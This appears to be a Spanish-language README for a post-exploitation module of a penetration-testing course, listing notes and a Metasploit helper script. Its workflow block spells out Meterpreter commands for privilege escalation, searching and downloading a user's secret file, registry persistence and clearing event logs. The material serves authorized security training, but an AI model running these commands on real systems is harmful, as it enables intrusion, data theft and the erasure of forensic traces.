# 04 — Post-Explotación

> **Fase 4 del ciclo de auditoría:** una vez dentro del sistema, maximizar el acceso, extraer valor y garantizar la continuidad del control.

---

## ¿Qué es la post-explotación?

Obtener la primera sesión es solo el comienzo. La post-explotación es todo lo que ocurre después:

```
Sesión inicial obtenida
        │
        ├──► Escalada de privilegios  →  De usuario a SYSTEM
        ├──► Reconocimiento interno   →  ¿Qué hay en la red?
        ├──► Exfiltración             →  Robo de datos críticos
        ├──► Persistencia             →  Garantizar el acceso futuro
        └──► Borrado de huellas       →  Eliminar rastros forenses
```

---

## Contenido del módulo

### 📝 Apuntes

| Archivo | Descripción |
|---------|-------------|
| [escalada-privilegios-windows.md](apuntes/escalada-privilegios-windows.md) | UAC bypass, getsystem, Potato attacks, privilegios explotables, WinPEAS |
| [persistencia-y-backdoors.md](apuntes/persistencia-y-backdoors.md) | Registro, scheduled tasks, servicios, WMI, startup folder y cómo detectarlas |

### 🛠️ Scripts

| Script | Descripción | Uso |
|--------|-------------|-----|
| [post_recon.py](scripts/post_recon.py) | Genera un .rc de Metasploit con reconocimiento interno automatizado | `python3 post_recon.py --session 1` |

---

## Flujo de trabajo tras obtener la sesión

```bash
# 1. Verificar quién somos y qué podemos hacer
meterpreter > getuid
meterpreter > getprivs
meterpreter > sysinfo

# 2. Intentar escalar a SYSTEM
meterpreter > getsystem

# 3. Si falla getsystem, buscar vectores alternativos
meterpreter > run post/multi/recon/local_exploit_suggester

# 4. Reconocimiento interno automatizado
python3 scripts/post_recon.py --session 1 --os windows --output /root/recon/
msfconsole -r post_recon_1.rc

# 5. Exfiltrar el activo crítico
meterpreter > search -f *.txt -d C:\\Users
meterpreter > download "C:\\Users\\admin\\Desktop\\secreto.txt" /root/

# 6. Establecer persistencia
msf > use exploit/windows/persistence/registry

# 7. Borrar huellas
meterpreter > clearev
```

---

## ⚠️ Aviso Legal

> La post-explotación en sistemas sin autorización constituye un **delito grave**.
> Todo lo documentado aquí es exclusivamente para entornos controlados,
> auditorías autorizadas y programas de Bug Bounty con scope definido.
